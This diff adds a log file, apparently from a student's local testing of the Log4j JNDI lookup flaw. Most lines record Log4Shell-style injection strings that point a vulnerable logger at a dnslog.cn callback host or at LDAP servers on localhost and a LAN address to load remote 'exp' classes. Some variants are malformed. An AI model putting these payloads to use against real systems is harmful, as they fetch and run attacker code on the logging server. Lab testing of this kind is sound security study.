@@ -1,0 +1,63 @@
+ERROR main STUD.LiuZheng.Log - package edu.sdut.Controller;
+public class TestClass {
+    public static void main(String[] args) {
+        System.out.println(9*9);
+    }
+}
+ 
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://xxxxx.dnslog.cn/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://xxxxx.dnslog.cn/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://xxxxx.dnslog.cn/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://xxxxx.dnslog.cn/exp}
+ERROR main STUD.LiuZheng.Log - package edu.sdut.Controller;
+public class TestClass {
+    public static void main(String[] args) {
+        System.out.println(9*9);
+    }
+}
+ 
+ERROR main STUD.LiuZheng.Log -  hello {jndi:ldap://0.0.0.0:1389/Rest}
+ERROR main STUD.LiuZheng.Log -  ${jndi:ldap://aqrvzf.dnslog.cn/exp}
+ERROR main STUD.LiuZheng.Log -  ${jndi:ldap://0.0.0.0:8080/Rest}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://0.0.0.0:8080/Rest}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://http://localhost:9090/log/test}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://0.0.0.0:9090/log/test}
+ERROR main STUD.LiuZheng.Log - /${jndi:ldap://0.0.0.0:9090/log/test}
+ERROR main STUD.LiuZheng.Log - ''${jndi:ldap://0.0.0.0:9090/log/test}
+ERROR main STUD.LiuZheng.Log - ''${jndi:ldap://http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log -  ${jndi:ldap://http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log -  ${jndi:ldap://http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log -  hello '' ${jndi:ldap://http://127.0.0.1:9090/log/test}
+INFO main STUD.LiuZheng.Log - \ ${jndi:ldap://http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log -  ${jndi:ldap:http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log -  '${jndi:ldap:http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log -  '' ${jndi:ldap:http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap:http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log - \${jndi:ldap:http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log - heoo \${jndi:ldap:http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log - heoo \${jndi:ldap://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.AKt$main$logger$1 -  aaaa  ${jndi:ldap://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.AKt$main$logger$1 -  aaaa  ${jndi:ldap://http://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.AKt$main$logger$1 -  <SomeStevePlayer> Hello  ${jndi:ldap://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.AKt$main$logger$1 -  <SomeStevePlayer> Hello  ${jndi:ldap://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.AKt$main$logger$1 -  <SomeStevePlayer> Hello  ${jndi:ldap://127.0.0.1:9090/log/test}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://0.0.0.1:/Log}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://0.0.0.1:/Log}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://0.0.0.1:/Log}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://0.0.0.9001:/Log}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://0.0.0.9001:/Log.class}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://192.168.1.103:9001/Log}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://http://192.168.1.103:9001/Log.class}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://192.168.1.103:9001/Log.class}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://192.168.1.103:9001/Log}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://192.168.1.103:9001/Log}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://192.168.1.103:9999/LifExp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://192.168.1.103:9999/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://192.168.1.103:9999/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://192.168.1.103:9999/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://192.168.1.103:9999/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://192.168.1.103:9999/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://http://192.168.1.103:9999/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://92.168.1.103:9999/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://92.168.1.103:9999/exp}
+ERROR main STUD.LiuZheng.Log - ${jndi:ldap://92.168.1.103:9999/exp}
